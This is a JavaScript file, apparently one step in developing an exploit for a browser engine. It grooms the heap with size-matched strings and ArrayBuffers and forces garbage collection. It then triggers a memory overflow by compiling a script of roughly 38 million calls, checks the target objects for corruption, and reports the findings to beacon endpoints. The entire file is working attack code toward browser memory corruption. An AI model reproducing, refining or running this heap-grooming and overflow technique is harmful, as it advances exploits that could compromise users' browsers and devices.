// p149 — diagnostic: is 81400 from the sweep or from something else?
// Two modes: CONTROL (no overflow) vs OVERFLOW (trigger the write)
// Tests: charCodeAt on corrupted strings, ArrayBuffer byte scan, typeof checks
// Beacon prefix: V149-

(function() {
  var BOOT_MS = Date.now();
  function tagNow() { return Date.now() - BOOT_MS; }

  function B(tag, body) {
    var url = '/beacon/V149-' + tag + '?t=' + Date.now();
    try {
      var x = new XMLHttpRequest();
      x.open('POST', url, true);
      if (body) x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body ? '{' + body + '}' : null);
    } catch (e) {
      try {
        var g = new XMLHttpRequest();
        g.open('GET', url + (body ? '&b=' + encodeURIComponent('{' + body + '}') : ''), true);
        g.send();
      } catch (e2) {}
    }
  }

  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  // MODE: control=no overflow, overflow=trigger the write
  // URL param ?mode=control or ?mode=overflow (default: overflow)
  var MODE = 'overflow';
  try {
    var m = location.search.match(/mode=(\w+)/);
    if (m) MODE = m[1];
  } catch (e) {}

  B('BOOT-' + MODE, '"ms0":' + tagNow());

  // ---- PHASE 1: allocate targets ----
  // StringImpl header = 20 bytes. Overflow buffer alloc = 100,096 bytes.
  // Match size class: 100,096 - 20 = 100,076 chars.
  var STR_LEN = 100076;
  var AB_SIZE = 100096; // match overflow buffer marge size class
  var CANARY = 0x41; // 'A'

  // Bait strings (to create free marge slots)
  var baits = [];
  for (var i = 0; i < 20; i++) {
    baits.push('B'.repeat(STR_LEN));
  }

  // Target strings
  var targets = [];
  for (var i = 0; i < 14; i++) {
    var t = 'A'.repeat(STR_LEN);
    t.charCodeAt(0); // force resolve now
    targets.push(t);
  }

  // Target ArrayBuffers (same marge size class)
  var abTargets = [];
  for (var i = 0; i < 6; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    var u8 = new Uint8Array(ab);
    for (var j = 0; j < AB_SIZE; j++) u8[j] = CANARY;
    abTargets.push(ab);
  }

  // Substring views for data integrity check
  var views = [];
  for (var i = 0; i < targets.length; i++) {
    views.push(targets[i].substring(0, 90000));
  }

  // Verify pre-overflow state
  var preOK = true;
  for (var i = 0; i < targets.length; i++) {
    if (targets[i].length !== STR_LEN) { preOK = false; break; }
  }
  B('PRE-' + (preOK ? 'OK' : 'FAIL'), '"len0":' + targets[0].length);

  // ---- PHASE 2: free baits, GC pressure, FR gate ----
  var FR_SEEN = false;
  var fr;
  try {
    fr = new FinalizationRegistry(function(h) {
      if (!FR_SEEN) B('GC-FREE', '"s":"' + h + '"');
      FR_SEEN = true;
    });
  } catch (e) { fr = null; }

  // Register some bait wrappers with FR (strings are primitives, need object wrapper)
  var baitRefs = [];
  for (var i = 0; i < 8; i++) baitRefs.push({ s: baits[i] });
  if (fr) {
    try {
      for (var i = 0; i < 8; i++) fr.register(baitRefs[i], 'b' + i);
    } catch (e) { B('FR-REG-ERR'); }
  }

  // Free baits + wrappers
  for (var i = 0; i < baits.length; i++) baits[i] = null;
  baits = null;
  for (var i = 0; i < baitRefs.length; i++) baitRefs[i] = null;
  baitRefs = null;

  var gcRound = 0;
  function gcPressureRound() {
    try {
      for (var g = 0; g < 200; g++) {
        var tmp = new ArrayBuffer(8192);
        tmp = null;
      }
    } catch (e) {}
    gcRound++;
    if (gcRound < 30) {
      setTimeout(gcPressureRound, 50);
    } else {
      B('GC-DONE-30', '"fr":' + FR_SEEN + ',"ms":' + tagNow());
      if (MODE === 'control') {
        phaseReadDiag('CTRL');
      } else {
        phaseBuildOverflow();
      }
    }
  }
  B('GC-START');
  gcPressureRound();

  // ---- PHASE 3: build overflow (only in overflow mode) ----
  function phaseBuildOverflow() {
    var N = 38348816;
    B('BUILD', '"n":' + N);

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    parts[0] = 'window.__v149fn=function(a){';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__v149ok=true;';
    callChunk = null;

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB', '"mb":' + Math.round(blob.size / 1048576) + ',"ms":' + tagNow());
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__v149ok ? 'OK' : 'FAIL'), '"ms":' + tagNow());
      if (!window.__v149fn) { B('NO-FN'); return; }
      // READ BEFORE CALLING — overflow already happened during compilation
      // The call always SIGSEVs, so we must read corruption state NOW
      phaseReadDiag('OVF');
      // Then attempt the call (will likely crash, that's OK)
      setTimeout(function() { phaseCallAndRead(); }, 2000);
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }

  function phaseCallAndRead() {
    setTimeout(function() {
      B('CALLING');
      var tStart = Date.now();
      var returned = false;
      try { window.__v149fn(function(){}); returned = true; }
      catch (ex) { B('CATCH', '"e":"' + (ex.message || '').substring(0, 40) + '"'); }
      var ms = Date.now() - tStart;

      if (!returned) {
        B('NO-RETURN', '"ms":' + ms);
      } else {
        B('SURVIVED', '"ms":' + ms);
        phaseReadDiag('OVF');
      }
    }, 100);
  }

  // ---- PHASE 4: diagnostic reads ----
  function phaseReadDiag(prefix) {
    B(prefix + '-READ-START', '"ms":' + tagNow());

    // STRING DIAGNOSTICS
    for (var i = 0; i < targets.length; i++) {
      var len = -1, typ = '', c0 = -2, c81399 = -2, c81400 = -2, c99999 = -2;
      var vLen = -1, v0 = -2;

      try { len = targets[i].length; } catch (e) { len = -99; }
      try { typ = typeof targets[i]; } catch (e) { typ = 'ERR'; }
      try { c0 = targets[i].charCodeAt(0); } catch (e) { c0 = -1; }
      try { c81399 = targets[i].charCodeAt(81399); } catch (e) { c81399 = -1; }
      try { c81400 = targets[i].charCodeAt(81400); } catch (e) { c81400 = -1; }
      try { c99999 = targets[i].charCodeAt(STR_LEN - 1); } catch (e) { c99999 = -1; }
      try { vLen = views[i].length; } catch (e) { vLen = -99; }
      try { v0 = views[i].charCodeAt(0); } catch (e) { v0 = -1; }

      // Alternative length read: force slow path via Object.getOwnPropertyDescriptor
      var altLen = -2;
      try {
        var desc = Object.getOwnPropertyDescriptor(targets[i], 'length');
        if (desc) altLen = desc.value;
      } catch (e) { altLen = -1; }

      if (len !== STR_LEN || c0 !== CANARY) {
        B(prefix + '-S' + i,
          '"len":' + len +
          ',"altLen":' + altLen +
          ',"typ":"' + typ + '"' +
          ',"c0":' + c0 +
          ',"c81399":' + c81399 +
          ',"c81400":' + c81400 +
          ',"c99999":' + c99999 +
          ',"vLen":' + vLen +
          ',"v0":' + v0);
      }

      // If length changed, try to read bytes at the boundary
      if (len !== STR_LEN && len > 0 && c0 !== -1) {
        var boundary = '';
        var bStart = Math.max(0, len - 4);
        var bEnd = Math.min(len + 4, 120000);
        for (var b = bStart; b < bEnd; b++) {
          var ch;
          try { ch = targets[i].charCodeAt(b); } catch (e) { ch = -1; }
          boundary += (ch === -1 ? 'XX' : hexByte(ch));
        }
        B(prefix + '-BOUND-' + i, '"s":' + bStart + ',"e":' + bEnd + ',"h":"' + boundary + '"');
      }
    }

    // ARRAYBUFFER DIAGNOSTICS
    for (var i = 0; i < abTargets.length; i++) {
      var u8;
      try { u8 = new Uint8Array(abTargets[i]); } catch (e) { B(prefix + '-AB-ERR-' + i); continue; }
      var changed = 0, firstOff = -1, firstVal = -1;
      for (var j = 0; j < u8.length; j++) {
        if (u8[j] !== CANARY) {
          if (firstOff === -1) { firstOff = j; firstVal = u8[j]; }
          changed++;
        }
      }
      if (changed > 0) {
        // Dump first 256 bytes around first change
        var dumpStart = Math.max(0, firstOff - 16);
        var hex = '';
        for (var d = dumpStart; d < Math.min(dumpStart + 256, u8.length); d++) {
          hex += hexByte(u8[d]);
        }
        B(prefix + '-AB' + i, '"changed":' + changed + ',"first":' + firstOff + ',"fv":' + firstVal);
        B(prefix + '-ABH' + i + '-' + hex);
      }
    }

    // SUMMARY
    var corruptStr = 0, corruptAB = 0;
    for (var i = 0; i < targets.length; i++) {
      try { if (targets[i].length !== STR_LEN) corruptStr++; } catch (e) { corruptStr++; }
    }
    for (var i = 0; i < abTargets.length; i++) {
      try {
        var u8 = new Uint8Array(abTargets[i]);
        for (var j = 0; j < u8.length; j++) {
          if (u8[j] !== CANARY) { corruptAB++; break; }
        }
      } catch (e) { corruptAB++; }
    }
    B(prefix + '-SUMMARY', '"str":' + corruptStr + ',"ab":' + corruptAB + ',"ms":' + tagNow());
    B('FINAL-OK');
  }
})();
